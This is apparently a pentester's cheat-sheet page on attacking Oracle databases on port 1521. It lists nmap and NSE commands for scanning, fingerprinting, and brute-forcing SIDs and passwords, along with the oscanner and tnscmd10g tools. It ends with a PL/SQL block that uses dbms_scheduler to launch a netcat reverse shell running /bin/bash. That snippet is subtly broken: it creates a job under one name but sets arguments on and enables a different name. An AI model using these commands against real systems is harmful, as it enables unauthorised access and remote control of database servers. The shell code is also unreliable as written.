---
description: TCP/1521
---

# Oracle

## Enumerating with nmap

```bash
nmap -v -n -Pn -sT -p 1521 --open --oA report_oracle $range
grep open report_oracle.gnmap | cut -d" " -f2 > hosts_oracle.txt
```

## Enumeration with NSE

```bash
#fingerprint
nmap -p 1521 --script=oracle-tns-version $ip

nmap -p 1521 --script oracle-sid-brute $ip
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=$sid $ip
```

## Enumeration Tools

```bash
oscanner -s $ip -P 1521 

tnscmd10g version -h $ip
```

## Oracle Reverse Shell

```sql
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
```

